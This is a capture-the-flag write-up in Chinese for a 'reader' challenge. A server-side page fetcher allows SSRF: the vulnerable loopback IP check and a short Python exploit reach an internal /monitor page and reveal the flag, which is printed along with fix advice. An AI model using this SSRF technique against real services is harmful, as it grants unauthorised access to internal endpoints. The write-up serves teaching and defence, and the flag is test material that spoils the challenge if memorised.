# reader

## 题目简述

网站接收 `site` 参数，服务器用 `requests.get` 抓取目标页面，删除脚本与样式后把 HTML 返回。内部 `/monitor` 页面会向本机请求显示 flag，向外部请求只显示未授权。由于抓取器没有限制目标 URL，可以利用 SSRF 让服务器自己访问 `/monitor`。

## 解题过程

访问控制只比较来源地址：

```python
if request.remote_addr in ("localhost", "127.0.0.1"):
    return render_template(
        "admin.html",
        message=flag,  # 其他模板参数省略
    )
```

而首页对 `site_to_visit` 直接执行 `get(site_to_visit)`。把目标设置为服务自身的 loopback URL：

```python
import requests

base = "https://TARGET"
response = requests.get(base + "/", params={
    "site": "http://127.0.0.1:5000/monitor",
})
text = response.text
start = text.index("tjctf{")
print(text[start:text.index("}", start) + 1])
```

容器内 Flask 正监听 5000 端口，因此 loopback URL 可直接到达同一进程。抓取器的 HTML 清理只去除 `head/script/style` 和若干属性，`admin.html` 正文中的 flag 会保留，并通过 `{{ content|safe }}` 原样显示：

```text
tjctf{maybe_dont_make_random_server_side_requests_dd695b62}
```

## 方法总结

- “阅读器”功能本质是服务器端 URL 获取器，必须按 SSRF 威胁模型处理。
- 仅在敏感端点检查来源 IP 不能抵御同一应用中的 SSRF；攻击请求正是由受信任 loopback 发出。
- HTML 清理解决的是展示杂质，不是网络访问控制。修复应使用目标域白名单、DNS/IP 校验、禁用私网地址，并隔离抓取服务的网络权限。
